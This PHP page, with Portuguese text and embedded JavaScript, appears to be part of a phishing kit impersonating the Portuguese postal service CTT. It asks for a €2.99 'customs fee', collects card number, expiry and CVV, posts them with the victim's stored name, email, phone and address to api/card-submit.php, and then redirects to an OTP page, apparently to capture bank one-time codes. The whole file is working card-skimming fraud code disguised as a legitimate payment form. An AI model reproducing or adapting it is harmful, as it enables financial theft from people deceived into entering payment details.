<?php
session_start();
require_once 'includes/header.php';
?>

<div class="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
    <div class="bg-white shadow-lg border-0 rounded-lg overflow-hidden">
        <div class="p-8">
            <!-- Form Header -->
            <div class="flex items-center mb-8">
                <svg class="w-5 h-5 text-red-600 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L5.082 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
                </svg>
                <h2 class="text-xl font-semibold text-gray-900">
                    Pagar as taxas alfandegárias (€ 2,99)
                </h2>
            </div>

            <!-- Customer Info Summary -->
            <div class="bg-gray-50 rounded-lg p-4 mb-6" id="customerInfo">
                <h3 class="font-semibold text-gray-900 mb-2">Dados do cliente:</h3>
                <p class="text-sm text-gray-700" id="customerDetails">
                    <!-- Will be populated by JavaScript -->
                </p>
                <p class="text-sm text-gray-600" id="customerAddress">
                    <!-- Will be populated by JavaScript -->
                </p>
            </div>

            <!-- Payment Summary -->
            <div class="bg-gray-50 rounded-lg p-4 mb-6">
                <div class="flex items-center justify-between">
                    <div class="flex items-center">
                        <div class="w-12 h-8 bg-blue-600 rounded flex items-center justify-center text-white text-xs font-bold mr-3">
                            VISA
                        </div>
                        <div>
                            <p class="text-sm font-medium text-gray-900">Taxa Alfandegária</p>
                            <p class="text-xs text-gray-600">Pagamento único</p>
                        </div>
                    </div>
                    <div class="text-right">
                        <p class="text-lg font-bold text-gray-900">€ 2,99</p>
                        <p class="text-xs text-gray-600">IVA incluído</p>
                    </div>
                </div>
            </div>

            <!-- Payment Form -->
            <form id="cardForm">
                <div class="space-y-6">
                    <!-- Card Number -->
                    <div class="space-y-2">
                        <label for="numeroCartao" class="text-sm font-medium text-gray-700">
                            Número do cartão <span class="text-red-500">*</span>
                        </label>
                        <input
                            id="numeroCartao"
                            name="numeroCartao"
                            type="text"
                            required
                            maxlength="19"
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                            placeholder="0000 0000 0000 0000"
                        />
                    </div>

                    <div class="grid grid-cols-2 gap-4">
                        <!-- Expiry Date -->
                        <div class="space-y-2">
                            <label for="dataExpiracao" class="text-sm font-medium text-gray-700">
                                Data de expiração <span class="text-red-500">*</span>
                            </label>
                            <input
                                id="dataExpiracao"
                                name="dataExpiracao"
                                type="text"
                                required
                                maxlength="5"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                                placeholder="MM/AA"
                            />
                        </div>

                        <!-- CVV -->
                        <div class="space-y-2">
                            <label for="cvv" class="text-sm font-medium text-gray-700">
                                CVV <span class="text-red-500">*</span>
                            </label>
                            <input
                                id="cvv"
                                name="cvv"
                                type="text"
                                required
                                maxlength="4"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                                placeholder="000"
                            />
                        </div>
                    </div>
                </div>

                <!-- Security Notice -->
                <div class="mt-6 flex items-center text-sm text-gray-600 bg-green-50 p-3 rounded-lg">
                    <svg class="w-4 h-4 text-green-600 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                    <span>Os seus dados de pagamento são processados de forma segura e encriptada.</span>
                </div>

                <!-- Terms Notice -->
                <div class="mt-6 text-sm text-gray-600">
                    Ao clicar no botão "Seguinte", está a aceitar as Condições Especiais de Envio Internacional.
                </div>

                <!-- Submit Button -->
                <div class="mt-8 flex justify-end">
                    <button
                        type="submit"
                        id="submitBtn"
                        class="px-8 py-2 rounded-md font-medium transition-all duration-200 bg-red-600 hover:bg-red-700 text-white"
                    >
                        <span id="btnText">Seguinte</span>
                        <span id="btnLoading" class="hidden">
                            <svg class="animate-spin -ml-1 mr-3 h-4 w-4 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 714 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                            </svg>
                            Processando...
                        </span>
                    </button>
                </div>
            </form>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Load billing data from sessionStorage
    const billingData = JSON.parse(sessionStorage.getItem('ctt_billing_data') || '{}');
    
    if (!billingData.nome) {
        // If no billing data, redirect to billing page
        window.location.href = 'billing.php';
        return;
    }
    
    // Populate customer info
    document.getElementById('customerDetails').innerHTML = 
        `<strong>${billingData.nome}</strong> • ${billingData.email} • ${billingData.telefone}`;
    document.getElementById('customerAddress').innerHTML = 
        `${billingData.endereco}, ${billingData.codigoPostal} ${billingData.cidade}`;
    
    // Card number formatting
    document.getElementById('numeroCartao').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
        let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
        if (value.length <= 16) {
            e.target.value = formattedValue;
        }
    });
    
    // Expiry date formatting
    document.getElementById('dataExpiracao').addEventListener('input', function(e) {
        let value = e.target.value.replace(/[^0-9]/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        if (value.length <= 5) {
            e.target.value = value;
        }
    });
    
    // CVV formatting
    document.getElementById('cvv').addEventListener('input', function(e) {
        let value = e.target.value.replace(/[^0-9]/g, '');
        if (value.length <= 4) {
            e.target.value = value;
        }
    });
    
    // Form submission
    const form = document.getElementById('cardForm');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const btnLoading = document.getElementById('btnLoading');
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const formData = new FormData(form);
        const cardData = Object.fromEntries(formData);
        
        // Remove spaces from card number for submission
        cardData.numeroCartao = cardData.numeroCartao.replace(/\s/g, '');
        
        // Validate card number length
        if (cardData.numeroCartao.length !== 16) {
            alert('Número do cartão deve ter 16 dígitos');
            return;
        }
        
        // Show loading state
        submitBtn.disabled = true;
        submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
        submitBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
        btnText.classList.add('hidden');
        btnLoading.classList.remove('hidden');
        
        try {
            const response = await fetch('api/card-submit.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    billing_data: billingData,
                    card_data: cardData
                })
            });
            
            const result = await response.json();
            
            if (result.status === 'success') {
                // Store card data and session ID
                sessionStorage.setItem('ctt_card_data', JSON.stringify(cardData));
                sessionStorage.setItem('ctt_session_id', result.session_id);
                
                // Navigate to OTP page
                window.location.href = 'otp.php';
            } else {
                alert('Erro: ' + result.message);
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Erro ao processar pagamento. Tente novamente.');
        } finally {
            // Reset loading state
            submitBtn.disabled = false;
            submitBtn.classList.remove('bg-gray-400', 'cursor-not-allowed');
            submitBtn.classList.add('bg-red-600', 'hover:bg-red-700');
            btnText.classList.remove('hidden');
            btnLoading.classList.add('hidden');
        }
    });
});
</script>

<?php require_once 'includes/footer.php'; ?>